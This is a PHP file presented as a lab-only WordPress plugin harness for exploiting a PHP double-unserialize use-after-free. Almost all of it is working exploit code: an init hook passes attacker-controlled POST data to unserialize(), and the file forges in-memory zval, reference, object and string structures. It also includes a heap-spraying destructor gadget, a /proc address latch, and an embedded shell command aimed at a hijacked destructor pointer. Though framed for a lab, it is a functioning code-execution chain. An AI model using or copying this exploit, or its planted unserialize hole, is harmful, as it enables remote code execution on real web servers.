<?php
/**
 * php2shell LAB-ONLY — var_destroy terminal-call harness for the FPM/WordPress
 * lab. NOT a real plugin. Models a plugin-level double-unserialize bug.
 *
 * Request: POST /?vd=1&latch=1  field d=<outer payload>
 *          (optional field zif=<hex>; default is the 0x41 sentinel)
 *
 * The carrier + latch + forged reference/object chain is the same as
 * lab-pure-modphp/webroot/vd.php; this is the FPM/WordPress port.
 */
if (!defined('ABSPATH')) {
    exit;
}

const VD_OFF_ZVAL = 0x100;
const VD_OFF_REF  = 0x200;
const VD_OFF_OBJ  = 0x300;
const VD_OFF_HT   = 0x400;
const VD_OFF_STR  = 0x500;

function vd_p8(string &$s, int $off, int $val): void {
    $p = pack('P', $val);
    for ($i = 0; $i < 8; $i++) { $s[$off + $i] = $p[$i]; }
}
function vd_p4(string &$s, int $off, int $val): void {
    $p = pack('V', $val & 0xFFFFFFFF);
    for ($i = 0; $i < 4; $i++) { $s[$off + $i] = $p[$i]; }
}
function vd_pn(string &$s, int $off, string $b): void {
    for ($i = 0, $n = strlen($b); $i < $n; $i++) { $s[$off + $i] = $b[$i]; }
}

class WP_VD_Gadget
{
    public function __destruct()
    {
        $zv = $GLOBALS['VD_FAKE_ZVAL'] ?? 0;
        $spray = array();
        for ($i = 0; $i < 64; $i++) {
            $s = str_repeat("\x41", 8135);
            $q = pack('P', $zv);
            for ($j = 0; $j < 8; $j++) { $s[$j] = $q[$j]; }
            $spray[] = $s;
        }
        @unserialize('R:1020;');
        unset($spray);
    }
}

add_action('init', function () {
    if (($_GET['vd'] ?? '') !== '1' || !isset($_POST['d'])) {
        return;
    }
    $magic = hex2bin('56445541464d41474943307864656164'); // VDUAFMAGIC0xdead
    $carrier = str_repeat("\x00", 0x1000);
    /* 32-byte marker at 0x800/0x810 for the /proc latch */
    vd_pn($carrier, 0x800, $magic);
    vd_pn($carrier, 0x810, $magic);

    $addr = hexdec($_POST['addr'] ?? '0');
    if ($addr === 0 && ($_GET['latch'] ?? '') === '1') {
        @unlink('/out/vd_addr');
        echo "READY\n";
        @flush();
        $deadline = time() + 20;
        while (time() < $deadline) {
            if (is_file('/out/vd_addr')) {
                $h = trim(@file_get_contents('/out/vd_addr'));
                if ($h !== '') { $addr = @hexdec($h); break; }
            }
            usleep(100000);
        }
    }
    if ($addr === 0) {
        http_response_code(500);
        echo "locate failed\n";
        return;
    }

    $zif = hexdec($_POST['zif'] ?? '0');
    $dtor = $zif !== 0 ? $zif : 0x4141414141414141;   // sentinel by default
    $cmd = "id>/tmp/vd 2>&1";

    $fake_zval = $addr + VD_OFF_ZVAL;
    $fake_ref  = $addr + VD_OFF_REF;
    $fake_obj  = $addr + VD_OFF_OBJ;
    $fake_ht   = $addr + VD_OFF_HT;
    $fake_str  = $addr + VD_OFF_STR;

    vd_p8($carrier, VD_OFF_ZVAL + 0, $fake_ref);
    vd_p4($carrier, VD_OFF_ZVAL + 8, 10 | (1 << 8));      // IS_REFERENCE
    vd_p4($carrier, VD_OFF_ZVAL + 12, 0);
    vd_p4($carrier, VD_OFF_REF + 0, 0);                    // refcount 0
    vd_p4($carrier, VD_OFF_REF + 4, 26);                   // GC_REFERENCE
    vd_p8($carrier, VD_OFF_REF + 8, $fake_obj);
    vd_p4($carrier, VD_OFF_REF + 16, 8 | (1 << 8));        // IS_OBJECT
    vd_p4($carrier, VD_OFF_REF + 20, 0);
    vd_p8($carrier, VD_OFF_REF + 24, 0);
    vd_p4($carrier, VD_OFF_OBJ + 0, 1);
    vd_p4($carrier, VD_OFF_OBJ + 4, 8);                    // IS_OBJECT
    vd_p4($carrier, VD_OFF_OBJ + 8, 0);
    vd_p8($carrier, VD_OFF_OBJ + 16, 0);
    vd_p8($carrier, VD_OFF_OBJ + 24, $fake_ht);
    vd_p8($carrier, VD_OFF_OBJ + 32, 0);
    vd_p4($carrier, VD_OFF_OBJ + 40, 0);
    vd_p4($carrier, VD_OFF_OBJ + 44, 1);                   // num_args
    vd_p8($carrier, VD_OFF_OBJ + 48, 0);
    vd_p8($carrier, VD_OFF_OBJ + 56, 0);
    vd_p8($carrier, VD_OFF_OBJ + 64, 0);
    vd_p8($carrier, VD_OFF_OBJ + 72, 0);
    vd_p8($carrier, VD_OFF_OBJ + 80, $fake_str);
    vd_p4($carrier, VD_OFF_OBJ + 88, 6);                   // IS_STRING
    vd_p4($carrier, VD_OFF_OBJ + 92, 0);
    vd_p4($carrier, VD_OFF_HT + 0, 0);
    vd_p8($carrier, VD_OFF_HT + 8, 0);
    vd_p8($carrier, VD_OFF_HT + 16, $dtor);
    vd_p4($carrier, VD_OFF_STR + 0, 0x40000000);
    vd_p4($carrier, VD_OFF_STR + 4, 6);                    // IS_STRING
    vd_p8($carrier, VD_OFF_STR + 8, 0);
    vd_p8($carrier, VD_OFF_STR + 16, strlen($cmd));
    vd_pn($carrier, VD_OFF_STR + 24, $cmd);

    $GLOBALS['VD_CARRIER'] = $carrier;
    $GLOBALS['VD_FAKE_ZVAL'] = $fake_zval;
    @file_put_contents('/tmp/vd_wp_stage',
        "addr=0x" . dechex($addr) . " dtor=0x" . dechex($dtor) . "\n",
        FILE_APPEND);

    $allowed = ($_POST['allowed'] ?? '1') !== '0';
    @unserialize(wp_unslash($_POST['d']),
        $allowed ? array() : array('allowed_classes' => false));
    echo "vd-wp done\n";
});
